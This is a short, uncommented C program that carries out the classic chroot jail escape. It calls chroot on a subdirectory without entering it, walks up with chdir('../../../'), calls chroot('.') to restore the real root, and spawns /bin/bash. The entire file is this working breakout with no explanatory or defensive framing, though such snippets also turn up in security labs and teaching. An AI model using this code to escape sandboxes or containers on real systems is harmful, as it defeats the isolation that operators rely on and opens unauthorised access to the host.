#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
int main(){
	
	
	chroot("./new-root");
	chdir("../../../");
	chroot(".");
	execl("/bin/bash", "/bin/bash", NULL);




}